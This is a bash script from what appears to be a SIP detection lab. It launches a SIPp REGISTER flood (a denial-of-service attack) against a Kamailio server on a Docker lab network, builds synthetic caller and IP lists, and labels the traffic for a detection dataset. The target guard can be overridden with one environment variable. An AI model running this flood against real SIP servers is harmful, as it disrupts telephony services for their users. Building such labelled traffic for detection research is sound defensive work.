#!/usr/bin/env bash
# DoS: SIP REGISTER flood via SIPp against Kamailio on the lab bridge.
# MITRE: T1499 (Endpoint Denial of Service)
# OWASP: A04 Insecure Design.
# Detection: SIP REGISTER burst, Kamailio pike/secfilter counters, Wazuh/SIEM volume anomalies.
# FP scenarios: mass softphone reconnect after network outage or PBX restart.
# Author: ngn-sip-detect-defend - Date: 2026-05-12

set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
REPO_ROOT="$(cd "${SCRIPT_DIR}/../.." && pwd)"

SIPP_IMAGE="ngn-sip/sipp:3.7.3"
NETWORK="${ATTACK_NETWORK:-ngn-sip_sip_lab}"
TARGET_PORT="${TARGET_PORT:-5060}"
REGISTER_RATE="${REGISTER_RATE:-50}"
DURATION_SECONDS="${DURATION_SECONDS:-30}"
CONCURRENCY_LIMIT="${CONCURRENCY_LIMIT:-300}"
SYNTHETIC_NET_PREFIX="${SYNTHETIC_NET_PREFIX:-198.18}"
OUTPUT_DIR="${OUTPUT_DIR:-./data/pcaps}"
PYTHON_BIN="${PYTHON_BIN:-python3}"

# run_phase defaults TARGET_HOST to 127.0.0.1 for host-based tools. This
# containerized attack should stay on the Compose bridge and use Kamailio's
# service alias unless explicitly overridden for lab debugging.
TARGET_HOST="${TARGET_HOST:-kamailio}"
if [[ "${TARGET_HOST}" == "127.0.0.1" || "${TARGET_HOST}" == "localhost" ]]; then
  DOCKER_TARGET_HOST="${DOCKER_TARGET_HOST:-kamailio}"
else
  DOCKER_TARGET_HOST="${DOCKER_TARGET_HOST:-${TARGET_HOST}}"
fi

if [[ "${DOCKER_TARGET_HOST}" != "kamailio" && "${ALLOW_NONLOCAL_TARGET:-0}" != "1" ]]; then
  echo "refusing non-lab target '${DOCKER_TARGET_HOST}'; set ALLOW_NONLOCAL_TARGET=1 to override" >&2
  exit 2
fi

is_positive_int() {
  [[ "$1" =~ ^[1-9][0-9]*$ ]]
}

if ! is_positive_int "${TARGET_PORT}"; then
  echo "TARGET_PORT must be a positive integer: ${TARGET_PORT}" >&2
  exit 2
fi
if ! is_positive_int "${REGISTER_RATE}"; then
  echo "REGISTER_RATE must be a positive integer: ${REGISTER_RATE}" >&2
  exit 2
fi
if ! is_positive_int "${DURATION_SECONDS}"; then
  echo "DURATION_SECONDS must be a positive integer: ${DURATION_SECONDS}" >&2
  exit 2
fi
if ! is_positive_int "${CONCURRENCY_LIMIT}"; then
  echo "CONCURRENCY_LIMIT must be a positive integer: ${CONCURRENCY_LIMIT}" >&2
  exit 2
fi

CALLS=$((REGISTER_RATE * DURATION_SECONDS))
RUN_DIR="${OUTPUT_DIR}/04_dos"
mkdir -p "${RUN_DIR}"
CSV_FILE="$(mktemp "${RUN_DIR}/sipp_register_flood.XXXXXX.csv")"
SCENARIO_FILE="${SCRIPT_DIR}/sipp_register_flood.xml"
LABEL_SRC_IP="${LABEL_SRC_IP:-${SYNTHETIC_NET_PREFIX}.0.1}"

cleanup() {
  rm -f "${CSV_FILE}"
}
trap cleanup EXIT

if [ ! -f "${SCENARIO_FILE}" ]; then
  echo "scenario not found: ${SCENARIO_FILE}" >&2
  exit 1
fi
if ! command -v docker >/dev/null 2>&1; then
  echo "docker is required to run ${SIPP_IMAGE}" >&2
  exit 1
fi
if ! docker network inspect "${NETWORK}" >/dev/null 2>&1; then
  echo "docker network not found: ${NETWORK}; start the lab stack first" >&2
  exit 1
fi
if ! docker image inspect "${SIPP_IMAGE}" >/dev/null 2>&1; then
  echo "docker image not found: ${SIPP_IMAGE}; build the SIPp image first" >&2
  exit 1
fi

{
  echo "SEQUENTIAL"
  for ((i = 0; i < CALLS; i++)); do
    third_octet=$(((i / 254) % 256))
    fourth_octet=$(((i % 254) + 1))
    printf 'flood%06d;%s.%d.%d\n' "${i}" "${SYNTHETIC_NET_PREFIX}" "${third_octet}" "${fourth_octet}"
  done
} > "${CSV_FILE}"

echo "==> sipp REGISTER flood ${DOCKER_TARGET_HOST}:${TARGET_PORT} rate=${REGISTER_RATE}/s duration=${DURATION_SECONDS}s calls=${CALLS}"

docker run --rm \
  --name "ngn-sip-sipp-register-flood-$$" \
  --network "${NETWORK}" \
  --cap-drop ALL \
  --security-opt no-new-privileges:true \
  --read-only \
  --pids-limit 120 \
  --memory 128m \
  --cpus 0.5 \
  --tmpfs /tmp:mode=1777,size=16m \
  --tmpfs /work:uid=10001,gid=10001,mode=0755,size=16m \
  -v "${SCENARIO_FILE}:/scenario/sipp_register_flood.xml:ro" \
  -v "${CSV_FILE}:/data/sipp_register_flood.csv:ro" \
  "${SIPP_IMAGE}" \
  "${DOCKER_TARGET_HOST}:${TARGET_PORT}" \
  -sf /scenario/sipp_register_flood.xml \
  -inf /data/sipp_register_flood.csv \
  -m "${CALLS}" \
  -r "${REGISTER_RATE}" \
  -rp 1000 \
  -l "${CONCURRENCY_LIMIT}" \
  -timeout "$((DURATION_SECONDS + 10))" \
  -nostdin

(
  cd "${REPO_ROOT}"
  "${PYTHON_BIN}" -m attacks.orchestrator.label_emitter \
    "${LABEL_SRC_IP}" \
    "sippts_register_flood" \
    "T1499" \
    "dos" \
    "sipp image=${SIPP_IMAGE}, target=${DOCKER_TARGET_HOST}:${TARGET_PORT}, rate=${REGISTER_RATE}/s, duration=${DURATION_SECONDS}s, calls=${CALLS}, synthetic_prefix=${SYNTHETIC_NET_PREFIX}.0.0/15"
)
